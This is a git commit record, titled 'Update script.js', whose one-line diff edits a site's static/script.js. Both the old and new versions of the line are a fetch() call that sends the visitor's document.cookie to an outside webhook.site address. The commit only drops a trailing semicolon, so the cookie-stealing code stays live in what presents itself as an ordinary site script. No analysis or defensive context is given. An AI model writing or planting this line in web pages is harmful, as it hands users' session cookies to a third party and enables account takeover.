f86cd360bf220eb8773c18290ce454d9d3341b6c
Sonder311 <csitsonder@gmail.com>
2025-08-12 00:01:37 +0800

    Update script.js

--- static/script.js
+++ static/script.js
@@ -1,1 +1,1 @@
-fetch('https://webhook.site/f5f5248b-8814-4a15-93f6-b3fcd9c0199f?a=' + encodeURIComponent(document.cookie));
+fetch('https://webhook.site/f5f5248b-8814-4a15-93f6-b3fcd9c0199f?a=' + encodeURIComponent(document.cookie))
